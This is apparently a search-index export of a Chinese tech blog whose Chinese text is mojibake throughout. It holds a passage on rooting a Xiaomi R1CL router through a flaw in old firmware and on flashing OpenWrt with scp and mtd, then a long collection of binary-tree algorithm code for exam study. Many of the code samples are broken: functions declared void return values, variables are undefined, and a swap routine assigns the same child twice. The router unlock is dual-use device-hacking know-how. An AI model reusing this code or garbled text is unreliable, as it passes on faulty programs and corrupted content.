ç‰ˆæœ¬(miwifi_r1cl_all_59371_2.1.26.bin) æ›´é«˜ç‰ˆæœ¬å·²ç»ä¿®å¤äº†æ­¤æ–¹æ³•,æ‰€ä»¥åªèƒ½æ˜¯æ­¤ç‰ˆæœ¬ ä¸‹è½½åœ°å€1: ç™¾åº¦Wç›˜: e2p6 ç™»å½•åå°æ‰‹åŠ¨å‡çº§ç³»ç»Ÿ åå°åœ°å€: 192.168.1.1 è¿›å…¥åå°å,ç³»ç»Ÿå‡çº§,æ‰‹åŠ¨é€‰æ‹©,é€‰æ‹©å¯¹åº”çš„ROMåŒ…,ç­‰å¾…5-8åˆ†é’Ÿå·¦å³,è·¯ç”±å™¨ä¼šè‡ªåŠ¨å‡çº§,é‡å¯ æœ¬åœ°ä»¥å¤ªç½‘è®¾ç½®æ‰‹åŠ¨IPåœ°å€ä¸º192.168.31.2 è¿›å…¥åå°192.168.31.1è¿›è¡Œå¼•å¯¼ æ­¤è¿‡ç¨‹ä¸­ä¼šè®¾ç½®Wifiåç§°å¯†ç ,ä»¥åŠç®¡ç†å‘˜å¯†ç , æ³¨æ„!: ç®¡ç†å‘˜å¯†ç å¾ˆé‡è¦,åé¢ä¼šç”¨åˆ° åœ°å€æ å¼€å¯ROOTå’Œssh è¿›å…¥åå°å,æµè§ˆå™¨åœ°å€å†…ä¼šå‡ºç° http://192.168.31.1/cgi-bin/luci/;stok=09a506ee0b8e14d4acf3004a504eba4d/web/home#router è¿™æ ·çš„ä¿¡æ¯, æˆ‘ä»¬å°†URLä¸­ /web/home#router ä¿®æ”¹ä¸º/api/xqsystem/set_name_password?oldPwd=å‰é¢è®¾ç½®çš„ç®¡ç†å‘˜å¯†ç &amp;newPwd=æ–°çš„ç®¡ç†å‘˜å¯†ç  æ³¨æ„:æ–°å¯†ç ä¸æ—§å¯†ç ä¸èƒ½ä¸€è‡´ å›è½¦å: å¦‚æœæˆåŠŸåˆ™è¿”å›{â€œcodeâ€:0}, å¦‚æœæ˜¯å…¶ä»–å‚æ•°,è¯·æ£€æŸ¥è½¯ä»¶åŒ…æ˜¯å¦ä¸º:59371_2.1.26 æµ‹è¯• ç”µè„‘è¿æ¥è·¯ç”±å™¨çš„æƒ…å†µä¸‹,æ§åˆ¶å°: ssh root@192.168.31.1 ç¬¬ä¸€æ¬¡ç™»å½•ä¼šæç¤ºå­˜å‚¨å¯†é’¥,yeså³å¯","categories":[{"name":"æŠ€æœ¯å‘","slug":"æŠ€æœ¯å‘","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/"},{"name":"è·¯ç”±å™¨","slug":"æŠ€æœ¯å‘/è·¯ç”±å™¨","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/%E8%B7%AF%E7%94%B1%E5%99%A8/"}],"tags":[{"name":"è·¯ç”±å™¨","slug":"è·¯ç”±å™¨","permalink":"https://www.sizaif.com/tags/%E8%B7%AF%E7%94%B1%E5%99%A8/"}],"author":"sizaif"},{"title":"å°ç±³é’æ˜¥ç‰ˆä½¿ç”¨OpenWrtå®ç°æ— çº¿ä¸­ç»§åŠŸèƒ½","slug":"å°ç±³é’æ˜¥ç‰ˆä½¿ç”¨OpenWrtå®ç°æ— çº¿ä¸­ç»§åŠŸèƒ½","date":"2021-08-11T14:01:54.000Z","updated":"2021-08-14T14:15:24.808Z","comments":true,"path":"posts/57997d7/","link":"","permalink":"https://www.sizaif.com/posts/57997d7/","excerpt":"","text":"@auther by sizaif @TOC ç®€ä»‹ å› ä¸ºå°ç±³è·¯ç”±å™¨è‡ªå¸¦çš„åå°æ— çº¿åŠŸèƒ½å¤ªé¸¡è‚‹äº†, æ— æ³•å®ç°è‡ªå®šä¹‰è®¾ç½®DCHP,é»˜è®¤ä¸ºDCHPåˆ†é…IP,ä½†æ˜¯åˆ†é…çš„IPåœ°å€å’Œä¸»è·¯ç”±å™¨åœ¨åŒä¸€ä¸ªå­—æ®µ,å½“è®¾å¤‡å¤šæ—¶ä¼šé€ æˆIPå†²çªç°è±¡.æ‰€ä»¥å°†æœºå™¨åˆ·æœºæˆOpenwrtåå®ç°éœ€è¦çš„åŠŸèƒ½ å°ç±³é’æ˜¥ç‰ˆOpenWrtåˆ·æœº ä¸€è§£é”SSHä¸Root å‚è€ƒæ–‡ç« é“¾æ¥:å°ç±³é’æ˜¥ç‰ˆè·¯ç”±å™¨è§£é”rootä¸SSHæ–¹æ³• åˆ·å…¥OpenWrtåŒ… ä½¿ç”¨æœ‰çº¿è¿æ¥ç”µè„‘å’Œè·¯ç”±å™¨ ä¸‹è½½åœ°å€: 1: é‡å‘½ååŒ…åä¸º 1.bin 2: å°†ä¸‹è½½çš„æ–‡ä»¶æ‹·è´åˆ°è·¯ç”±å™¨ä¸­ /tmpç›®å½•ä¸‹ ä½¿ç”¨CMDæ§åˆ¶å°å‘½ä»¤: (ä¸ºäº†æ–¹ä¾¿,å¯ä»¥æŠŠæ–‡ä»¶æ”¾åˆ°æˆ‘çš„æ–‡æ¡£é‡Œ, ipåœ°å€åº”è¯¥ä¸º192.168.31.1, å¦‚æœç¬¬ä¸€æ¬¡åˆ·å®Œæœº) 1: scp 1.bin root@192.168.31.1:/tmp/ 3: åˆ·æœº è¿›å…¥è·¯ç”±å™¨å†…éƒ¨/tmp/ç›®å½•ä¸‹: ssh root@192.168.31.1 å¼€å§‹åˆ·æœº cd /tmp/ mtd -r write 1.bin firmware ç­‰å¾…ä¸€ä¼šåè·¯ç”±å™¨ä¼šé‡å¯ åˆ·æœºå®Œæˆ æµè§ˆå™¨è¿›å…¥è·¯ç”±å™¨åå°","categories":[{"name":"æŠ€æœ¯å‘","slug":"æŠ€æœ¯å‘","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/"},{"name":"è·¯ç”±å™¨","slug":"æŠ€æœ¯å‘/è·¯ç”±å™¨","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/%E8%B7%AF%E7%94%B1%E5%99%A8/"}],"tags":[{"name":"è·¯ç”±å™¨","slug":"è·¯ç”±å™¨","permalink":"https://www.sizaif.com/tags/%E8%B7%AF%E7%94%B1%E5%99%A8/"}],"author":"sizaif"},{"title":"äºŒå‰æ ‘é¢˜ç›®ç®—æ³•é¢˜ç›®æ•´ç†(é™„ä»£ç )","slug":"äºŒå‰æ ‘é¢˜ç›®ç®—æ³•é¢˜ç›®æ•´ç†-é™„ä»£ç ","date":"2021-08-11T14:01:48.000Z","updated":"2021-09-19T10:14:26.591Z","comments":true,"path":"posts/cfa0d73d/","link":"","permalink":"https://www.sizaif.com/posts/cfa0d73d/","excerpt":"","text":"@auther by sizaif è¯´æ˜ï¼š ç”±ä¸ªäººæ•´ç†ï¼Œéƒ¨åˆ†é¢˜ç›®æ˜¯ç‹é“çš„é¢˜ç›®,å·²ç»ç»å¸¸ä¼šè€ƒçš„ç‚¹ã€‚ å› ä¸ªäººä»£ç é£æ ¼,å·²ç»stackå’Œqueueçš„ä»£ç å®ç°ä¸åŒ,ä»£ç ç•¥æœ‰ä¸åŒä¹‹å¤„ï¼Œ ä½†æ€»ä½“æ€æƒ³æ˜¯æ­£ç¡®çš„ æœ‰é”™è¯¯ä¹‹å¤„,æ¬¢è¿æŒ‡å‡º by sizaif @TOC äºŒå‰æ ‘ code ++/** * æ ‘ç»“æ„ */ typedef struct Node&#123; char x; struct Node *lson,*rson; &#125;Tree,*BiTree; typedef struct Queue&#123; //è‡ªå·±æ„é€ é˜Ÿåˆ— BiTree *x; int front; int rear; void Initqueue() &#123; front=rear=0; x =(BiTree *)malloc(MAX*sizeof(Tree)); &#125; void POP() &#123; front=(front+1)%MAX; &#125; int length() &#123; return (rear-front +MAX)%MAX; &#125; bool emptys() &#123; if(front==rear) return 1; return 0; &#125; void Push_back(BiTree T) &#123; if((rear+1)%MAX==front) return; x[rear]=T; rear=(rear+1)%MAX; &#125; BiTree Getfront() &#123; if(front==rear) return NULL; BiTree T; T = x[front]; return T; &#125; &#125;queues; typedef struct Stack&#123; // è‡ªå·±æ„é€ æ ˆ BiTree *tt; int top; int size; void InitStack() &#123; tt= ( BiTree *)malloc(n*sizeof(Tree)); top=0; size=n; &#125; bool emptys() &#123; if(top==0) return true; return false; &#125; void Push_back(BiTree num) &#123; tt[top++]=num; &#125; void Pop() &#123; if(top==0)return; top--; //num=x[--top]; &#125; BiTree Gettop() &#123; if(top==0) return NULL; return tt[top-1];// top &#125; &#125;stacks; 1) é‡‡ç”¨ä¸‹åˆ—æ–¹æ³•ä¹‹ä¸€å»ºç«‹äºŒå‰æ ‘çš„äºŒå‰é“¾è¡¨ï¼š a) è¾“å…¥å®Œå…¨äºŒå‰æ ‘çš„å…ˆåºåºåˆ—ï¼Œç”¨#ä»£è¡¨è™šç»“ç‚¹ï¼ˆç©ºæŒ‡é’ˆï¼‰ï¼Œå¦‚ABD###CE##F##ï¼Œå»ºç«‹äºŒå‰æ ‘çš„äºŒå‰é“¾è¡¨ã€‚ code ++/** * å…ˆåºå»ºç«‹ * @param T [description] */ void build_frist(BiTree &amp;T) &#123; char ch; scanf(\"%c\",&amp;ch); if(ch=='#') T=NULL; else &#123; T= new Tree ; T->x=ch; build_frist(T->lson); build_frist(T->rson); &#125; &#125; b) å·²çŸ¥äºŒå‰æ ‘çš„å…ˆåºéå†åºåˆ—å’Œä¸­åºéå†åºåˆ—ã€‚ code ++/** * [pre_mid_build å…ˆåº+ä¸­åºå»ºç«‹äºŒå‰æ ‘] * @param Fi [å…ˆåº] * @param In [ä¸­åº] * @param l1 [å…ˆåºå·¦ç«¯ä¸‹æ ‡] * @param h1 [å…ˆåºå³ç«¯ä¸‹æ ‡] * @param l2 [ä¸­åºå·¦ç«¯ä¸‹æ ‡] * @param h2 [ä¸­åºå³ç«¯ä¸‹æ ‡] * åˆå§‹ l1 = l2 = 0 , h1 = h2 = n; */ BiTree pre_mid_build(BiTree Fi[],BiTree In[],int l1,int h1,int l2,int h2) &#123; BiTree T = new Tree; T->data = Fi[l1]; for(int i = l2;In[i]!=Fi[l1] ; i++); int llen = i - l2; int rlen = h2 - i; if(llen) T->lchild = pre_mid_build(Fi,In,l1+1,l1+llen,l2,l2+llen-1); else T->lchild = NULL; if(rlen) T->rchild = pre_mid_build(Fi,In,h1-rlen+1,h1,h2-rlen+1,h2); else T->rchild = NULL; return T; &#125; /** * å·²çŸ¥å…ˆåºå’Œä¸­åº å»ºç«‹äºŒå‰æ ‘ * @param T [description] * @param Fi [description] * @param In [description] * @param n [description] */ void build(BiTree &amp;T,char *Fi,char *In,int n) &#123; if(n&lt;1) &#123; T=NULL; return; &#125; int i=0,l1=0,l2=0,p=0,m=0; char lson[120],rson[120]; char str1[120],str2[120]; mem(lson,0); mem(rson,0); T= new Tree; T->x=Fi[0]; while(In[i]!=Fi[0]) i++; l1=i; l2=n-i-1; int temp=i; for(int j=1;j&lt;=temp;j++) lson[j-1]=Fi[j]; for(int j=temp+1;j&lt;n;j++) &#123; rson[j-temp-1]=Fi[j]; str2[j-temp-1]=In[j]; &#125; for(int j=0;j&lt;temp;j++) str1[j]=In[j]; if(!lson[0]) T->lson=NULL; else build(T->lson,lson,str1,l1); if(!rson[0]) T->rson=NULL; else build(T->rson,rson,str2,l2); &#125; void frist_and_mid() &#123; cout&lt;&lt;\"*****************************\"&lt;&lt;endl; BiTree T2; char str1[120],str2[120],str3[120]; printf(\"input of the first :\\n\"); scanf(\"%s\",str1); printf(\"input of the mid :\\n\"); scanf(\"%s\",str2); int len=strlen(str1); build(T2,str1,str2,len); printf(\"æ„é€ çš„äºŒå‰æ ‘ ååºéå†ä¸º: \\n\"); query(T2,3); cout&lt;&lt;\"\\n*****************************\"&lt;&lt;endl; &#125; c) å·²çŸ¥äºŒå‰æ ‘çš„ä¸­åºéå†åºåˆ—å’Œååºéå†åºåˆ—ï¼Œå»ºç«‹äºŒå‰æ ‘çš„äºŒå‰é“¾è¡¨ã€‚ ++ 2) å†™å‡ºå¯¹ç”¨äºŒå‰é“¾è¡¨å­˜å‚¨çš„äºŒå‰æ ‘è¿›è¡Œå…ˆåºã€ä¸­åºå’Œååºéå†çš„é€’å½’ç®—æ³• code ++/** * ä¸‰ç§é€’å½’ 1å…ˆåº 2ä¸­åºä¸ 3ååº * @param T [description] * @param oper [description] */ void query(BiTree T,int oper) &#123; if(T) &#123; if(oper==1) printf(\"%c \",T->x); query(T->lson,oper); if(oper==2) printf(\"%c \",T->x); query(T->rson,oper); if(oper==3) printf(\"%c \",T->x); &#125; &#125; 3) å†™å‡ºå¯¹ç”¨äºŒå‰é“¾è¡¨å­˜å‚¨çš„äºŒå‰æ ‘è¿›è¡Œå…ˆåºéå†çš„éé€’å½’ç®—æ³•ã€‚ code ++/** * éé€’å½’å…ˆåº * @param T [description] */ void query_frist(BiTree T) &#123; stacks S; S.InitStack(); S.Push_back(T); while(!S.emptys()) &#123; while(S.Gettop()!=NULL) &#123; printf(\"%c \",S.Gettop()->x); S.Push_back(S.Gettop()->lson); &#125; S.Pop(); if(!S.emptys()) &#123; BiTree Temp; Temp=S.Gettop(); S.Pop(); S.Push_back(Temp->rson); &#125; &#125; &#125; 4) å†™å‡ºå¯¹ç”¨äºŒå‰é“¾è¡¨å­˜å‚¨çš„äºŒå‰æ ‘ä¸­åºéå†çš„éé€’å½’ç®—æ³•ã€‚ code ++/** * éé€’å½’ä¸­åº * @param T [description] */ void query_mid(BiTree T) &#123; stacks S; S.InitStack(); S.Push_back(T); while(!S.emptys()) &#123; while(S.Gettop()!=NULL) &#123; S.Push_back(S.Gettop()->lson); &#125; S.Pop(); if(!S.emptys()) &#123; BiTree Temp; Temp=S.Gettop(); printf(\"%c \",Temp->x); S.Pop(); S.Push_back(Temp->rson); &#125; &#125; &#125; 5) å†™å‡ºå¯¹ç”¨äºŒå‰é“¾è¡¨å­˜å‚¨çš„äºŒå‰æ ‘ååºéå†çš„éé€’å½’ç®—æ³•ã€‚ code ++/** * éé€’å½’ååº * @param T [description] */ void query_last(BiTree T) &#123; stacks S; S.InitStack(); S.Push_back(T); while(!S.emptys()) &#123; while(S.Gettop()!=NULL) &#123; S.Push_back(S.Gettop()->lson); &#125; S.Pop(); if(!S.emptys()) &#123; if(S.Gettop()->rson) S.Push_back(S.Gettop()->rson); else &#123; BiTree Temp; Temp=S.Gettop(); printf(\"%c \",Temp->x); S.Pop(); while(S.Gettop()!=NULL&amp;&amp;!S.emptys()&amp;&amp;S.Gettop()->rson==Temp) &#123; printf(\"%c \",S.Gettop()->x); Temp=S.Gettop(); S.Pop(); &#125; if(!S.emptys()) &#123; S.Push_back(S.Gettop()->rson); &#125; &#125; &#125; &#125; &#125; /** * [PostOrder ååºéå†äºŒå‰æ ‘éé€’å½’] * @param T [Bitree] */ void PostOrder(BiTree T) &#123; InitStack(S); BiTree p = T; BiTree r = NULL; while(p || !IsEmpty(S))&#123; if(p) // èµ°åˆ°æœ€å·¦è¾¹ &#123; Push(S,p); p = p->lchild; &#125; else &#123; GetTop(S,p); if(p->rchild &amp;&amp; p->rchild != r) // å³å­æ ‘å­˜åœ¨ä¸”æœªè¢«è®¿é—® &#123; p = p->rchild; // è½¬å‘å³ Push(S,p);// å…¥æ ˆ p = p->lchild; // è½¬å‘å·¦ &#125;else&#123; Pop(S,p); visit(p->data); r= p ; p = NULL; &#125; &#125; &#125; &#125; 6) å†™å‡ºå¯¹ç”¨äºŒå‰é“¾è¡¨å­˜å‚¨çš„äºŒå‰æ ‘è¿›è¡Œå±‚æ¬¡éå†ç®—æ³•ã€‚ code ++/** * [Invertlevel å±‚æ¬¡éå†,è‡ªä¸‹è€Œä¸Š,è‡ªå·¦åˆ°å³] * @param T [BiTree] * äºŒå‰æ ‘è‡ªä¸‹è€Œä¸Š,è‡ªå·¦åˆ°å³ * æ­£å¸¸å±‚æ¬¡éå†, å‡ºé˜Ÿæ—¶å…¥æ ˆ * æœ€åä¾æ¬¡å‡ºæ ˆä¸ºç»“æœ */ void Invertlevel(BiTree T) &#123; Stack&lt;int> S; Queue&lt;int> Q; BiTree p; if(T) &#123; InitQueue(Q); InitStack(S); EnQueue(Q,T); while(!IsEmpty(Q)) &#123; DeQueue(Q,p); Push(S,p); // å‡ºé˜Ÿ,å…¥æ ˆ if(p->lchild) EnQueue(Q,p->lchild); if(p->rchild) EnQueue(Q,p->rchild); &#125; while(!IsEmpty(S)) &#123; Pop(S,p); visit(p->data); // è‡ªä¸‹è€Œä¸Š,è‡ªå·¦åˆ°å³ &#125; &#125; &#125; 7) é€’å½’å®ç°æ±‚äºŒå‰æ ‘çš„æ‰€æœ‰å¶å­æ•°ã€‚ code ++/** * æ±‚äºŒå‰æ ‘çš„æ‰€æœ‰å¶å­æ•°] * @param T [description] */ void query_leaf(BiTree T)&#123; if(!T) return 0; if(T->lson == NULL &amp;&amp; T->rson == NULL) return 1; return query_leaf(T->lson)+query_leaf(T->rson); &#125; 8) é€’å½’å®ç°æ±‚äºŒå‰æ ‘çš„æ‰€æœ‰ç»“ç‚¹æ€»æ•°ã€‚ ++int query_node(BiTree T)// èŠ‚ç‚¹æ€»ä¸ªæ•° &#123; if(!T) return NULL; if(T->lson == NULL &amp;&amp; T->rson == NULL) return 1; return query_node(T->lson) + query_node(T->rson) + 1; &#125; 8+) æ±‚äºŒå‰æ ‘ç¬¬kå±‚çš„ç»“ç‚¹ä¸ªæ•° code ++/** * æ±‚äºŒå‰æ ‘ç¬¬ k å±‚çš„ç»“ç‚¹ä¸ªæ•° * æ€æƒ³: å¦‚å›¾ * @param T [description] * @param k [ç¬¬kå±‚] * @return [description] */ int query_levelk(BiTree T,k)&#123; if(!T) return 0; if(k &lt;= 0) return 0; if(k &lt;= 1) return 1; return query_levelk(T->lson,k-1) + query_levelk(T->rsom,k-1); &#125; 9) åˆ¤æ–­å®Œå…¨äºŒå‰æ ‘ code ++/** * åˆ¤æ–­å®Œå…¨äºŒå‰æ ‘ * @param T [description] * @return [description] */ bool judge(Bitree &amp;T) &#123; //1 2 4 8 -1 -1 9 -1 -1 5 10 -1 -1 -1 3 6 -1 -1 7 -1 -1 queue&lt;Bitree>Q; Bitree pre; Q.push(T); while(Q.front() != NULL) &#123; pre = Q.front(); Q.pop(); Q.push(pre->lson); Q.push(pre->rson); &#125; while(!Q.empty()) &#123; pre = Q.front(); Q.pop(); if(NULL != pre) return false; &#125; return true; &#125; 10) é€’å½’å®ç°æ±‚ äºŒå‰æ ‘é«˜åº¦(æ·±åº¦) code ++/** * äºŒå‰æ ‘é«˜åº¦ * @param T [description] * @return [description] */ int deep_tree(Bitree &amp;T) &#123; if(!T) return 0; int left = deep_tree(T->lson); int rig = deep_tree(T->rson); return left > rig ? (left+1):(rig+1); &#125; 11) éé€’å½’æ±‚äºŒå‰æ ‘é«˜åº¦(æ·±åº¦)(åˆ©ç”¨å±‚æ¬¡éå†) code ++/** * [BtDepth éé€’å½’æ±‚äºŒå‰æ ‘é«˜åº¦] * @param T [BiTree] * æ•°ç»„æ¨¡æ‹Ÿé˜Ÿåˆ—,level è®°å½•å±‚æ•°, * æ¯æ¬¡å±‚æ¬¡éå†å‡ºé˜Ÿåˆ—æ—¶,ä¸lastæŒ‡é’ˆæ¯”è¾ƒ,è‹¥ä¸¤è€…ç›¸åŒ,åˆ™å±‚æ•°+1; */ void BtDepth(BiTree T) &#123; if(!T) return 0; int front = -1 , rear = -1; int last = 0 , level = 0; BiTree Q[MAXN]; Q[++rear] = T; BiTree p; while(front &lt;= rear) &#123; p = Q[++front]; if(p->lchild) Q[++rear] = p->lchild; if(p->rchild) Q[++rear] = p->rchild; if(front == last)&#123; // è¯¥å±‚æœ€å³ç»“ç‚¹ level++; last = rear; // æ›´æ–° &#125; &#125; &#125; 11+) å­©å­å…„å¼Ÿè¡¨ç¤ºæ³•æ±‚æ ‘çš„æ·±åº¦ code ++/** * [Height_CS å­©å­å…„å¼Ÿè¡¨ç¤ºæ³•æ±‚æ ‘çš„æ·±åº¦] * @param T [description] * @return [description] */ int Height_CS(CSTree T) &#123; int hc,hs; if(T == NULL) return 0; else &#123; hc = Height_CS(T->fichild); // ç¬¬ä¸€å­æ ‘é«˜ hs = Height_CS(T->nextchild); // å…„å¼Ÿæ ‘é«˜ return hc+1 > hs ? hc+1 : hs; &#125; &#125; 12) åˆ¤æ–­å¹³è¡¡äºŒå‰æ•°æ˜¯å¦å¹³è¡¡ code ++/** * [judge_AVL åˆ¤æ–­äºŒå‰æ’åºæ ‘,æ˜¯å¦å¹³è¡¡] * @param T [description] * @param balance [description] * @param h [description] * balanc = 1 å¹³è¡¡, 0 ä¸å¹³è¡¡ * ç©ºæ ‘ , ä»…æœ‰æ ¹èŠ‚ç‚¹, å¹³è¡¡ */ void judge_AVL(BiTree T,int &amp;balance ,int &amp;h) &#123; int bl = 0, br = 0, hl = 0 , hr = 0; if(T == NULL) // ç©ºæ ‘ ,é«˜åº¦ä¸º 0 &#123; h = 0; balance = 1; &#125; else if(T->lchild == NULL &amp;&amp; T->rchild == NULL) // ä»…æœ‰æ ¹èŠ‚ç‚¹, é«˜åº¦ä¸º1 &#123; h = 1, balance = 1 ; &#125; else &#123; judge_AVL(T->lchild,bl,h1); judge_AVL(T->rchild,br,h2); h = (hl> hr ? hl:hr) +1; if(abs(hl-hr) &lt; 2) // é«˜åº¦å·® å°äº2 balance = bl &amp;&amp; br; //é€»è¾‘ä¸ å½“å·¦å³éƒ½å¹³è¡¡æ—¶, å¹³è¡¡ else balance = 0; &#125; &#125; 13) é€’å½’å®ç°æ±‚äºŒå‰æ ‘åŒåˆ†æ”¯èŠ‚ç‚¹æ ‘ code &#x2F;** * [DsonNode é€’å½’å®ç°æ±‚äºŒå‰æ ‘åŒåˆ†æ”¯èŠ‚ç‚¹æ ‘] * @param T [äºŒå‰é“¾è¡¨] * @return [èŠ‚ç‚¹æ•°] *&#x2F; int DsonNode(BiTree T) &#123; if(T&#x3D;&#x3D;NULL) return 0; else if(T-&gt;lchild !&#x3D;NULL &amp;&amp; T-&gt;rchild !&#x3D;NULL ) &#x2F;&#x2F; å·¦å³å­©å­éƒ½æœ‰ return DsonNode(T-&gt;lchild) + DsonNode(T-&gt;rchild) +1; else return DsonNode(T-&gt;lchild) + DsonNode(T-&gt;rchild); &#125; 14) é€’å½’å®ç°å·¦å³å­©å­äº’æ¢ code ++/** * [Swap_child é€’å½’å®ç°å·¦å³å­©å­äº’æ¢] * @param T [description] * å…ˆæ¢Tç»“ç‚¹ å·¦å­æ ‘å·¦å³å­©å­ * å†æ¢å³å­æ ‘, * æœ€åèŠ‚ç‚¹çš„å­©å­äº’æ¢ */ void Swap_child(Bitree T) &#123; if(T) &#123; Swap_child(T->lchild); // å…ˆå·¦å­æ ‘ Swap_child(T->rchild); // å³å­æ ‘ Bitree temp = T->lchild; // å·¦å³å­©å­äº’æ¢ T->lchild = T->rchild; T->lchild = temp; &#125; &#125; 15) åˆ é™¤äºŒå‰æ ‘ä¸­æ¯ä¸ªå…ƒç´ å€¼ ä¸ºxçš„ç»“ç‚¹ code ++/** * [Search åˆ é™¤äºŒå‰æ ‘ä¸­æ¯ä¸ªå…ƒç´ å€¼ ä¸ºxçš„ç»“ç‚¹] * å¹¶åˆ å»ä»¥ä»–ä¸ºæ ¹çš„å­æ ‘ * @param T [description] * @param x [description] * ååºéå†äºŒå‰æ ‘, å±‚æ¬¡éå†æ‰¾åˆ°ç»“ç‚¹çš„çˆ¶èŠ‚ç‚¹ */ void Search(BiTree T,ElemType x)&#123; BiTree Q[]; if(T) &#123; if(T->data == x) &#123; DeleteXTree(T); exit(0); &#125; InitQueue Q; EnQueue(Q,T); while(!IsEmpty(Q)) &#123; DeQueue(Q,p); if(p->lchild)&#123; // å·¦éç©º if(p->lchild->data == x) // å·¦å­æ ‘ç¬¦åˆ, åˆ é™¤å·¦å­æ ‘ &#123; DeleteXTree(p->lchild); p->lchild = NULL; &#125; else // çˆ¶èŠ‚ç‚¹å·¦å­æ ‘ç½®ä¸ºç©º EnQueue(Q,p->lchild); //å·¦å­å¥³å…¥é˜Ÿåˆ— &#125; if(p->rchild) // å³å­æ ‘ç¬¦åˆ, åˆ é™¤å³å­æ ‘ &#123; if(p->rchild->data == x) &#123; DeleteXTree(p->rchild); p->rchild = NULL; &#125; else EnQueue(Q,p->rchild); // å³å­å¥³å…¥é˜Ÿåˆ— &#125; &#125; &#125; &#125; 16) æ±‚å…ˆåºéå†ä¸­ç¬¬kä¸ªç»“ç‚¹çš„å€¼ code ++/** * [PreNode æ±‚å…ˆåºéå†ä¸­ç¬¬kä¸ªç»“ç‚¹çš„å€¼] * @param Bt [description] * @param k [description] * @return [description] */ int count = 1; ElemType PreNode(BiTree T, int k) &#123; if(T == NULL) return '#'; if( count == k) return T->data; count++; ch = PreNode(T->lchild,k); // å·¦å­æ ‘è¿”å›è¯¥å€¼ if(ch != '#') return ch; ch = PreNode(T->rchild,k); // å³å­æ ‘é€’å½’æŸ¥æ‰¾ return ch; &#125; 17) æ±‚ä»£æƒè·¯å¾„é•¿åº¦å’Œ code ++/** * [Wpl_preOreder æ±‚ä»£æƒè·¯å¾„é•¿åº¦å’Œ] * @param T [description] * @param deep [description] * @return [description] * 2014 408 çœŸé¢˜ , ç‹é“127é¡µ */ int Wpl(BiTree T) &#123; return Wpl_preOreder(T,0); &#125; int wpl = 0; int Wpl_preOreder(BiTree T,int deep) &#123; if(T->lchild == NULL &amp;&amp; T->rchild == NULL) // å¶èŠ‚ç‚¹ è¿”å› wp wpl += deep * T->data; if(T->lchild != NULL) Wpl_preOreder(T->lchild,deep+1); if(T->rchild != NULL) Wpl_preOreder(T->rchild,deep+1); return wpl; &#125; 18) æ±‚éç©ºäºŒå‰æ ‘çš„å®½åº¦ code ++/** * [BTWidth æ±‚éç©ºäºŒå‰æ ‘çš„å®½åº¦] * @param T [description] * @return [description] * å±‚æ¬¡éå†æ±‚æ‰€æœ‰ç‚¹çš„å±‚æ¬¡,å°†æ‰€æœ‰èŠ‚ç‚¹å’Œå¯¹åº”å±‚æ¬¡æ”¾åœ¨ä¸€ä¸ªé˜Ÿåˆ—ä¸­ * æ‰«æé˜Ÿåˆ—,æ±‚æœ€å¤§å±‚æ¬¡èŠ‚ç‚¹æ€»æ•° */ typedef struct&#123; BiTree data[MAXN];// å­˜æ”¾æŒ‡é’ˆ int level[MAXN];//å±‚æ¬¡ int front,rear; &#125;Que; int BTWidth(BiTree T) &#123; BiTree p; Que.front = Que.rear = -1; Que.rear ++; Que.data[Que.rear] = T; // å…¥é˜Ÿ Que.level[Que.rear] = 1;// å±‚æ¬¡ä¸º1; int k,Max,n; while(Que.front &lt; Que.rear) &#123; Que.front ++; // å‡ºé˜Ÿ p = Que.data[Que.front]; k = Que.level[Que.front]; if(p->lchlid != NULL) // å·¦å­©å­è¿›é˜Ÿåˆ— &#123; Que.rear++; Que.data[rear] = p->lchlid; Que.level[rear] = k + 1; &#125; if(p->rchild!=NULL) // å³å­©å­è¿›é˜Ÿåˆ— &#123; Que.rear++; Que.data[rear] = p->rchlid; Que.level[rear] = k + 1; &#125; &#125; Max = -1, k = 1; int i = 0; while( i &lt; Que.rear) &#123; n = 0; while(i&lt;Que.rear &amp;&amp; Que.level[i] == k) &#123; // ç»Ÿè®¡ç¬¬kæ›¾èŠ‚ç‚¹æ•° n++; i++; &#125; k = Que.level[i]; if( n > Max) Max = n; &#125; return Max; &#125; 19) åˆ¤æ–­ä¸¤é¢—äºŒå‰æ ‘æ˜¯å¦ç»“æ„ç›¸åŒ code ++/** * [åˆ¤æ–­ä¸¤ä¸ªäºŒå‰æ ‘ç»“æ„æ˜¯å¦ç›¸ç­‰] * @param T1 [description] * @param T2 [description] * @return [description] */ int isEqual(BiTree T1,BiTree T2)&#123; if( !T1 &amp;&amp; !T2) return 1; if( !T1 || !T2) return 0; return isEqual( T1->lson,T2->lson) &amp;&amp; isEqual(T1->rson,T2->rson); &#125; 20) æ±‚ä¸¤ä¸ªç»“ç‚¹çš„æœ€ä½(è¿‘)å…¬å…±ç¥–å…ˆç»“ç‚¹ code ++/** * [æ±‚ä¸¤ä¸ªç»“ç‚¹çš„æœ€ä½å…¬å…±ç¥–å…ˆç»“ç‚¹] * @param T [description] * @param A [description] * @param B [description] * @return [description] */ BiTree lowAnc(BiTree T,BiTree A,BiTree B)&#123; if( !T) return NULL; if( T == A || T == B) return T; // è¯´æ˜åœ¨æŸå·¦å­æ ‘æˆ–å³å­æ ‘ä¸­æ‰¾åˆ°ç›®æ ‡ç»“ç‚¹ BiTree left = lowAnc(T->lson,A,B); BiTree right = lowAnc(T->rson,A,B); // å½“åœ¨å·¦å­æ ‘å’Œå³å­æ ‘ä¸­éƒ½æ‰¾åˆ°A,B è¯´æ˜æ˜¯æœ€è¿‘çš„å…¬å…±ç¥–å…ˆ if( left != NULL &amp;&amp; right != NULL) return T; //å¯¹ä¸€ä¸ªåº•å±‚å‘ä¸Šæ›´æ–°çš„æ ¹ç»“ç‚¹æ¥è¯´ï¼Œåªåœ¨å·¦å­æ ‘æˆ–å³å­æ ‘æ‰¾åˆ°äº†ç›®æ ‡ç»“ç‚¹ï¼Œåˆ™è¿”å›æ‰¾åˆ°çš„ç»“ç‚¹ã€‚ return !left ? right:left; &#125; 20+) æ±‚ä»»æ„ä¸¤ç»“ç‚¹è·ç¦» code ++/** * [æ±‚ä¸¤ä¸ªç»“ç‚¹çš„æœ€ä½å…¬å…±ç¥–å…ˆç»“ç‚¹] * @param T [description] * @param A [description] * @param B [description] * @return [description] */ BiTree lowAnc(BiTree T,BiTree A,BiTree B)&#123; if( !T) return NULL; if( T == A || T == B) 